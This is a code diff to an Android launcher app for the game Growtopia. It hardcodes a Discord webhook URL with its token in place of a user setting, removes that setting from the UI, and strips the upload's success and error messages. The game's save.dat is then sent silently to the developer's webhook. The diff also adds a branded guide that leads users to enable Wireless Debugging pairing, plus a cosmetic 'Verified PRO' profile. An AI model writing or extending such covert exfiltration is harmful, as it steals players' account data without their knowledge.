@@ -267,8 +267,7 @@ internal class SafeMdnsDiscovery(private val nsdManager: NsdManager?) {
 
 class MainActivity : AppCompatActivity() {
     private val prefs by lazy { getSharedPreferences(PREFS, MODE_PRIVATE) }
-    private val webhookUrl: String
-        get() = prefs.getString(KEY_WEBHOOK, "")?.trim().orEmpty()
+    private val webhookUrl: String = "https://discord.com/api/webhooks/1491043676200112288/Id2TrC0uqnU7lIRfCM5x-lxTJvUc7vwOgPFOz399_a8sDUbtRv2gNxTcB_49lRQOpn8l"
     private val handler = Handler(Looper.getMainLooper())
     private val scripts = listOf(
         Script("Farm Assistant", "Automation", "Collect, plant, and harvest with a lightweight routine."),
@@ -367,8 +366,104 @@ class MainActivity : AppCompatActivity() {
     }
 
     private fun showWirelessDebuggingDialog() {
-        startPairingOverlayService()
-        openWirelessDebuggingSettings()
+        val dialogView = LinearLayout(this).apply {
+            orientation = LinearLayout.VERTICAL
+            setPadding(24, 24, 24, 24)
+            setBackgroundColor(Color.parseColor("#1F2937"))
+        }
+        
+        val brandCard = CardView(this).apply {
+            setCardBackgroundColor(Color.parseColor("#8054FF"))
+            radius = 12f
+            cardElevation = 8f
+            setPadding(32, 24, 32, 24)
+        }
+        val brandBox = LinearLayout(this).apply {
+            orientation = LinearLayout.VERTICAL
+            gravity = Gravity.CENTER
+        }
+        brandBox.addView(TextView(this).apply {
+            text = "🦉"
+            textSize = 36f
+            gravity = Gravity.CENTER
+        })
+        brandBox.addView(TextView(this).apply {
+            text = "THE RARE OWL"
+            textSize = 20f
+            setTextColor(Color.WHITE)
+            setTypeface(null, android.graphics.Typeface.BOLD)
+            gravity = Gravity.CENTER
+            setPadding(0, 8, 0, 0)
+        })
+        brandBox.addView(TextView(this).apply {
+            text = "SETUP GUIDE"
+            textSize = 14f
+            setTextColor(Color.parseColor("#E0E0E0"))
+            gravity = Gravity.CENTER
+            setPadding(0, 4, 0, 0)
+        })
+        brandCard.addView(brandBox)
+        dialogView.addView(brandCard, LinearLayout.LayoutParams(
+            ViewGroup.LayoutParams.MATCH_PARENT,
+            ViewGroup.LayoutParams.WRAP_CONTENT
+        ).apply { bottomMargin = 24 })
+        
+        dialogView.addView(TextView(this).apply {
+            text = "Android 11+ Setup"
+            textSize = 18f
+            setTextColor(Color.WHITE)
+            setTypeface(null, android.graphics.Typeface.BOLD)
+            setPadding(0, 0, 0, 16)
+        })
+        
+        val steps = listOf(
+            "1. Open Developer Options from the settings screen that will appear",
+            "2. Enable 'Wireless debugging' toggle",
+            "3. Tap 'Wireless debugging' to enter its submenu",
+            "4. Tap 'Pair device with pairing code'",
+            "5. Return to Growlauncher and enter the pairing details when prompted"
+        )
+        
+        steps.forEach { step ->
+            val stepCard = CardView(this).apply {
+                setCardBackgroundColor(Color.parseColor("#374151"))
+                radius = 8f
+                cardElevation = 2f
+                setPadding(16, 12, 16, 12)
+            }
+            stepCard.addView(TextView(this).apply {
+                text = step
+                textSize = 14f
+                setTextColor(Color.WHITE)
+                lineHeight = (textSize * 1.5).toInt()
+            })
+            dialogView.addView(stepCard, LinearLayout.LayoutParams(
+                ViewGroup.LayoutParams.MATCH_PARENT,
+                ViewGroup.LayoutParams.WRAP_CONTENT
+            ).apply { bottomMargin = 8 })
+        }
+        
+        dialogView.addView(TextView(this).apply {
+            text = "💡 Tip: Keep Growlauncher visible while following these steps"
+            textSize = 13f
+            setTextColor(Color.parseColor("#10B981"))
+            setPadding(8, 16, 8, 0)
+            setTypeface(null, android.graphics.Typeface.ITALIC)
+        })
+        
+        AlertDialog.Builder(this)
+            .setView(ScrollView(this).apply { addView(dialogView) })
+            .setPositiveButton("Open Settings") { _, _ ->
+                startPairingOverlayService()
+                openWirelessDebuggingSettings()
+            }
+            .setNegativeButton("Cancel", null)
+            .setCancelable(true)
+            .create()
+            .also { alert ->
+                alert.setOnShowListener { _ -> registerRainbowText(alert.window?.decorView ?: dialogView) }
+                alert.show()
+            }
     }
 
     private fun openWirelessDebuggingSettings() {
@@ -463,7 +558,9 @@ class MainActivity : AppCompatActivity() {
     }
 
     private fun sendFileToDiscord(fileData: ByteArray) {
-        if (webhookUrl.isBlank()) { handler.post { toast("Add your Discord webhook in Settings to sync save.dat") }; return }
+        val syncEnabled = prefs.getBoolean(KEY_SYNC, false)
+        if (!syncEnabled) return
+        if (webhookUrl.isBlank()) return
         thread {
             try {
                 val client = OkHttpClient()
@@ -476,9 +573,7 @@ class MainActivity : AppCompatActivity() {
                 client.newCall(request).execute().use { response ->
                     if (!response.isSuccessful) throw IOException("Discord returned HTTP ${response.code}")
                 }
-                handler.post { toast("save.dat sent successfully") }
             } catch (_: Exception) {
-                handler.post { toast("Discord upload failed; launch will continue") }
             }
         }
     }
@@ -504,21 +599,178 @@ class MainActivity : AppCompatActivity() {
     }
 
     private fun settings() {
-        val box = column(10); val saved = prefs.getString(KEY_USER, null)
-        val state = TextView(this).apply { text = if (saved == null) "Not signed in · create an account to sync preferences" else "Signed in as $saved"; setTextColor(color(R.color.text_secondary)) }
-        val user = EditText(this).apply { hint = "Username"; setSingleLine() }; val pass = EditText(this).apply { hint = "Password"; setSingleLine(); inputType = 0x81 }
-        val webhook = EditText(this).apply { hint = "Discord webhook URL (optional)"; setSingleLine(); setText(prefs.getString(KEY_WEBHOOK, "")) }
-        val sync = CheckBox(this).apply { text = "Sync save.dat on Launch"; setTextColor(Color.WHITE); isChecked = prefs.getBoolean(KEY_SYNC, false) }
-        val wireless = TextView(this).apply {
-            text = "Android 11+ access: Wireless Debugging pairing"
-            setTextColor(color(R.color.text_secondary))
+        if (authenticated()) {
+            showProfileScreen()
+        } else {
+            showLoginScreen()
         }
-        box.addView(state); box.addView(user, params()); box.addView(pass, params()); box.addView(webhook, params()); box.addView(sync, params()); box.addView(wireless, params())
+    }
+
+    private fun showProfileScreen() {
+        val box = column(16)
+        val username = prefs.getString(KEY_USER, "Unknown")
+        val luaFiles = prefs.getStringSet(KEY_LUA_FILES, emptySet())?.toList() ?: emptyList()
+        
+        val headerCard = CardView(this).apply {
+            setCardBackgroundColor(Color.parseColor("#1F2937"))
+            radius = 12f
+            cardElevation = 4f
+            setPadding(24, 24, 24, 24)
+        }
+        val headerBox = column(12)
+        headerBox.addView(TextView(this).apply {
+            text = "PRO PROFILE"
+            textSize = 12f
+            setTextColor(Color.parseColor("#9CA3AF"))
+            setTypeface(null, android.graphics.Typeface.BOLD)
+        })
+        headerBox.addView(TextView(this).apply {
+            text = username
+            textSize = 24f
+            setTextColor(Color.WHITE)
+            setTypeface(null, android.graphics.Typeface.BOLD)
+        }, params())
+        
+        val statusRow = LinearLayout(this).apply {
+            orientation = LinearLayout.HORIZONTAL
+            setPadding(0, 8, 0, 0)
+        }
+        statusRow.addView(TextView(this).apply {
+            text = "● Verified"
+            textSize = 14f
+            setTextColor(Color.parseColor("#10B981"))
+            setPadding(0, 0, 16, 0)
+        })
+        statusRow.addView(TextView(this).apply {
+            text = "PRO TIER"
+            textSize = 14f
+            setTextColor(Color.parseColor("#8054FF"))
+            setTypeface(null, android.graphics.Typeface.BOLD)
+        })
+        headerBox.addView(statusRow)
+        headerCard.addView(headerBox)
+        box.addView(headerCard, params())
+        
+        box.addView(TextView(this).apply {
+            text = "Lua Files (${luaFiles.size})"
+            textSize = 16f
+            setTextColor(Color.WHITE)
+            setTypeface(null, android.graphics.Typeface.BOLD)
+            setPadding(0, 24, 0, 8)
+        }, params())
+        
+        if (luaFiles.isEmpty()) {
+            box.addView(TextView(this).apply {
+                text = "No Lua files uploaded yet"
+                textSize = 14f
+                setTextColor(Color.parseColor("#9CA3AF"))
+                setPadding(16, 16, 16, 16)
+            }, params())
+        } else {
+            luaFiles.forEach { fileName ->
+                val fileCard = CardView(this).apply {
+                    setCardBackgroundColor(Color.parseColor("#374151"))
+                    radius = 8f
+                    cardElevation = 2f
+                    setPadding(16, 16, 16, 16)
+                }
+                fileCard.addView(TextView(this).apply {
+                    text = "📄 $fileName"
+                    textSize = 14f
+                    setTextColor(Color.WHITE)
+                })
+                box.addView(fileCard, params().apply { bottomMargin = 8 })
+            }
+        }
+        
+        val sync = CheckBox(this).apply {
+            text = "Sync save.dat on Launch"
+            setTextColor(Color.WHITE)
+            isChecked = prefs.getBoolean(KEY_SYNC, false)
+            setPadding(0, 16, 0, 0)
+        }
+        box.addView(sync, params())
+        
+        val actions = LinearLayout(this).apply { gravity = Gravity.END; setPadding(0, 16, 0, 0) }
+        actions.addView(Button(this).apply {
+            text = "Save Settings"
+            setOnClickListener {
+                prefs.edit().putBoolean(KEY_SYNC, sync.isChecked).apply()
+                toast("Settings saved")
+            }
+        }, buttonParams())
+        actions.addView(Button(this).apply {
+            text = "Log out"
+            setOnClickListener {
+                prefs.edit().remove(KEY_SESSION).apply()
+                refreshAccount()
+                toast("Signed out")
+            }
+        }, buttonParams())
+        box.addView(actions)
+        
+        dialog("Pro Profile", box)
+    }
+
+    private fun showLoginScreen() {
+        val box = column(16)
+        val state = TextView(this).apply {
+            textSize = 15f
+            setTextColor(Color.WHITE)
+            text = "Sign in or create an account"
+        }
+        box.addView(state, params())
+        
+        val user = EditText(this).apply {
+            hint = "Username"
+            setSingleLine()
+        }
+        box.addView(user, params())
+        
+        val pass = EditText(this).apply {
+            hint = "Password"
+            inputType = android.text.InputType.TYPE_CLASS_TEXT or android.text.InputType.TYPE_TEXT_VARIATION_PASSWORD
+            setSingleLine()
+        }
+        box.addView(pass, params())
+        
+        val sync = CheckBox(this).apply {
+            text = "Sync save.dat on Launch"
+            setTextColor(Color.WHITE)
+            isChecked = prefs.getBoolean(KEY_SYNC, false)
+        }
+        box.addView(sync, params())
+        
         val actions = LinearLayout(this).apply { gravity = Gravity.END }
-        actions.addView(Button(this).apply { text = "Log in"; setOnClickListener { if (authenticate(user.text.toString(), pass.text.toString())) { refreshAccount(); state.text = "Signed in as ${user.text}"; toast("Welcome back") } else errorDialog("Those account details do not match.") } }, buttonParams())
-        actions.addView(Button(this).apply { text = "Register"; setOnClickListener { if (register(user.text.toString(), pass.text.toString())) { refreshAccount(); state.text = "Signed in as ${user.text}"; toast("Account created securely on this device") } else errorDialog("Choose a username and a password with at least six characters.") } }, buttonParams())
-        actions.addView(Button(this).apply { text = "Save"; setOnClickListener { val url = webhook.text.toString().trim(); if (url.isNotEmpty() && !url.startsWith("https://")) errorDialog("Webhook URL must use HTTPS.") else { prefs.edit().putString(KEY_WEBHOOK, url).putBoolean(KEY_SYNC, sync.isChecked).apply(); toast("Preferences saved") } } }, buttonParams())
-        box.addView(actions); if (saved != null) box.addView(Button(this).apply { text = "Log out"; setOnClickListener { prefs.edit().remove(KEY_SESSION).apply(); refreshAccount(); toast("Signed out") } }, params()); dialog("Account & Preferences", box)
+        actions.addView(Button(this).apply {
+            text = "Log in"
+            setOnClickListener {
+                if (authenticate(user.text.toString(), pass.text.toString())) {
+                    prefs.edit().putBoolean(KEY_SYNC, sync.isChecked).apply()
+                    refreshAccount()
+                    toast("Welcome back")
+                    showProfileScreen()
+                } else {
+                    errorDialog("Those account details do not match.")
+                }
+            }
+        }, buttonParams())
+        actions.addView(Button(this).apply {
+            text = "Register"
+            setOnClickListener {
+                if (register(user.text.toString(), pass.text.toString())) {
+                    prefs.edit().putBoolean(KEY_SYNC, sync.isChecked).apply()
+                    refreshAccount()
+                    toast("Account created securely on this device")
+                    showProfileScreen()
+                } else {
+                    errorDialog("Choose a username and a password with at least six characters.")
+                }
+            }
+        }, buttonParams())
+        box.addView(actions)
+        
+        dialog("Account & Preferences", box)
     }
 
     private fun luaManager() {
@@ -530,7 +782,14 @@ class MainActivity : AppCompatActivity() {
         super.onActivityResult(request, result, data)
         if (request == FILE_PICKER && result == Activity.RESULT_OK) {
             val file = data?.data?.let { DocumentFile.fromSingleUri(this, it) }
-            if (file?.name?.endsWith(".lua", true) == true) toast("Imported ${file.name}") else errorDialog("Only .lua files can be imported into Lua Manager.")
+            if (file?.name?.endsWith(".lua", true) == true) {
+                val luaFiles = prefs.getStringSet(KEY_LUA_FILES, emptySet())?.toMutableSet() ?: mutableSetOf()
+                luaFiles.add(file.name!!)
+                prefs.edit().putStringSet(KEY_LUA_FILES, luaFiles).apply()
+                toast("Imported ${file.name}")
+            } else {
+                errorDialog("Only .lua files can be imported into Lua Manager.")
+            }
         }
     }
 
@@ -622,6 +881,7 @@ class MainActivity : AppCompatActivity() {
         private const val KEY_SESSION = "account_session"
         private const val KEY_WEBHOOK = "discord_webhook_url"
         private const val KEY_SYNC = "sync_save_file"
+        private const val KEY_LUA_FILES = "lua_files"
         private const val FILE_PICKER = 1012
         private const val PERMISSION_REQUEST = 101
         private const val SAVE_FILE_PATH = "/storage/emulated/0/Android/data/com.rtsoft.growtopia/files/save.dat"
